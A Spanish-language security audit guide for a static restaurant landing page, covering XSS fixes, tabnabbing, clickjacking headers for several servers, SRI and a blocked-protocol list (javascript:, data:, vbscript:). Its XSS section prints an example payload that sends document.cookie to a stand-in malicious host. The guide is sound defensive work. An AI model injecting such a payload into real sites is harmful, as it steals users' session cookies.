# 🔒 SEGURIDAD.md — Guía de Seguridad Web para Aurum Restaurante

> **Autor:** Auditoría de Seguridad SecOps  
> **Fecha:** Mayo 2025  
> **Alcance:** Landing page estática (HTML5/CSS3/JS Vanilla)

---

## Resumen de Mitigaciones Implementadas

| # | Vulnerabilidad | Severidad | Estado |
|---|---------------|-----------|--------|
| 1 | Cross-Site Scripting (XSS) | 🔴 Crítica | ✅ Mitigada |
| 2 | Tabnabbing (window.opener) | 🟡 Media | ✅ Mitigada |
| 3 | Clickjacking | 🟡 Media | ⚠️ Parcial (ver abajo) |
| 4 | Integridad de Recursos (SRI) | 🟡 Media | ℹ️ No aplica actualmente |
| 5 | MIME Sniffing | 🟢 Baja | ✅ Mitigada |
| 6 | Inyección de protocolos en imágenes | 🟡 Media | ✅ Mitigada |

---

## 1. Cross-Site Scripting (XSS) — `script.js`

### ¿Qué es?
Un atacante inyecta código JavaScript malicioso en datos que luego son renderizados en la página. Si se usa `innerHTML`, el navegador interpreta ese código y lo ejecuta.

### ¿Qué se hizo?
- Se **eliminó por completo el uso de `innerHTML`** en las funciones `renderizarMenu()` y `renderizarTestimonios()`.
- Se reemplazó por la **API segura del DOM**:
  - `document.createElement()` para crear nodos HTML.
  - `classList.add()` para asignar clases CSS.
  - `textContent` para asignar textos (nombres, precios, descripciones, testimonios).
- Se creó la función `sanitizarRutaImagen()` que valida las rutas de imagen y bloquea protocolos peligrosos (`javascript:`, `data:`, `vbscript:`).

### Ejemplo del antes vs. después:

```diff
- // ❌ VULNERABLE: innerHTML interpreta HTML/JS inyectado
- tarjeta.innerHTML = `<h3>${plato.nombre}</h3>`;

+ // ✅ SEGURO: textContent escapa todo como texto plano
+ const nombre = document.createElement('h3');
+ nombre.classList.add('menu__tarjeta-nombre');
+ nombre.textContent = plato.nombre;
+ tarjeta.appendChild(nombre);
```

### ¿Por qué importa?
Si en el futuro los datos del menú o testimonios provienen de una API externa, base de datos o CMS, un atacante podría insertar:
```
nombre: '<img src=x onerror="document.location=\'https://sitio-malicioso.com/robar?cookie=\'+document.cookie">'
```
Con `innerHTML`, esto se ejecutaría. Con `textContent`, se muestra como texto literal inofensivo.

---

## 2. Tabnabbing (window.opener) — `index.html`

### ¿Qué es?
Cuando un enlace usa `target="_blank"`, la página destino puede acceder a `window.opener` y redirigir la pestaña original a un sitio de phishing sin que el usuario lo note.

### ¿Qué se hizo?
Se auditaron **todos** los enlaces externos en `index.html`. Cada uno que usa `target="_blank"` incluye obligatoriamente:

```html
rel="noopener noreferrer"
```

### Enlaces auditados:
| Enlace | Ubicación | `rel` presente |
|--------|-----------|----------------|
| WhatsApp (navbar) | Línea ~46 | ✅ `noopener noreferrer` |
| Instagram | Footer | ✅ `noopener noreferrer` |
| Facebook | Footer | ✅ `noopener noreferrer` |
| TikTok | Footer | ✅ `noopener noreferrer` |
| Google Maps | Footer contacto | ✅ `noopener noreferrer` |
| WhatsApp (contacto) | Footer contacto | ✅ `noopener noreferrer` |
| WhatsApp (flotante) | Botón flotante | ✅ `noopener noreferrer` |

---

## 3. Clickjacking (Secuestro de Clics) — `index.html` + Servidor

### ¿Qué es?
Un atacante incrusta nuestra página dentro de un `<iframe>` invisible en su sitio web malicioso. El usuario cree que está interactuando con el sitio del atacante, pero en realidad está haciendo clic en botones de nuestra página (como "Reservar por WhatsApp").

### ¿Qué se hizo en el cliente?
Se agregó un meta tag CSP en `index.html`:
```html
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none'">
```

### ⚠️ ACCIÓN REQUERIDA EN EL SERVIDOR
El meta tag es un **respaldo**. La protección definitiva **DEBE** implementarse en las cabeceras HTTP del servidor. A continuación las instrucciones según la plataforma:

#### Apache (XAMPP / `.htaccess`):
```apache
# Agregar al archivo .htaccess en la raíz del proyecto
Header always set X-Frame-Options "DENY"
Header always set Content-Security-Policy "frame-ancestors 'none'"
Header always set X-Content-Type-Options "nosniff"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
```

#### Nginx:
```nginx
# Agregar dentro del bloque server {}
add_header X-Frame-Options "DENY" always;
add_header Content-Security-Policy "frame-ancestors 'none'" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

#### Vercel (`vercel.json`):
```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "Content-Security-Policy", "value": "frame-ancestors 'none'" },
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" }
      ]
    }
  ]
}
```

#### Netlify (`netlify.toml`):
```toml
[[headers]]
  for = "/*"
  [headers.values]
    X-Frame-Options = "DENY"
    Content-Security-Policy = "frame-ancestors 'none'"
    X-Content-Type-Options = "nosniff"
    Referrer-Policy = "strict-origin-when-cross-origin"
```

---

## 4. Integridad de Recursos de Terceros (SRI)

### ¿Qué es?
Subresource Integrity (SRI) permite verificar que un archivo cargado desde un CDN no haya sido alterado maliciosamente. Se añade un hash criptográfico al tag `<link>` o `<script>`.

### Estado actual:
Este proyecto **NO carga librerías externas** vía CDN (no FontAwesome, no Bootstrap, no jQuery). Los únicos recursos externos son:

| Recurso | Tipo | SRI aplicable |
|---------|------|---------------|
| Google Fonts CSS | Tipografía | ❌ No compatible* |
| `style.css` | Local | N/A (mismo origen) |
| `script.js` | Local | N/A (mismo origen) |

> \* **Google Fonts no soporta SRI** porque genera CSS dinámico según el User-Agent del navegador. Google cambia el contenido de la respuesta según si el navegador soporta WOFF2, WOFF, etc., lo cual invalida cualquier hash fijo.

### Si en el futuro se agrega un CDN:
Ejemplo de cómo implementar SRI correctamente:
```html
<!-- Ejemplo con una librería hipotética -->
<script
  src="https://cdn.ejemplo.com/libreria.min.js"
  integrity="sha384-AbCdEf123456789..."
  crossorigin="anonymous">
</script>
```

Para generar el hash SRI:
```bash
# Desde la terminal, descargar el archivo y generar su hash
curl -s https://cdn.ejemplo.com/libreria.min.js | openssl dgst -sha384 -binary | openssl base64 -A
```

O utilizar: [https://www.srihash.org/](https://www.srihash.org/)

---

## 5. Resumen de Archivos Modificados

| Archivo | Cambios de seguridad |
|---------|---------------------|
| `script.js` | Eliminación total de `innerHTML`, implementación de DOM API segura, función `sanitizarRutaImagen()`, comentarios de auditoría |
| `index.html` | Meta tags: CSP (`frame-ancestors`), `X-Content-Type-Options`, `Referrer-Policy`. Auditoría de `rel="noopener noreferrer"` en todos los enlaces externos |
| `SEGURIDAD.md` | Este archivo — documentación completa de la auditoría |

---

## 6. Recomendaciones Adicionales

1. **HTTPS obligatorio**: Asegurarse de que el sitio se sirva exclusivamente sobre HTTPS. En Apache, redirigir todo el tráfico HTTP → HTTPS.
2. **Cabecera HSTS**: Considerar añadir `Strict-Transport-Security: max-age=31536000; includeSubDomains` para forzar HTTPS por un año.
3. **Actualizaciones**: Mantener el servidor web (Apache/Nginx) actualizado para parchar vulnerabilidades conocidas.
4. **Validación de formularios**: Si en el futuro se agrega un formulario de contacto/reservación, validar y sanitizar TODA la entrada del usuario tanto en el cliente como en el servidor.
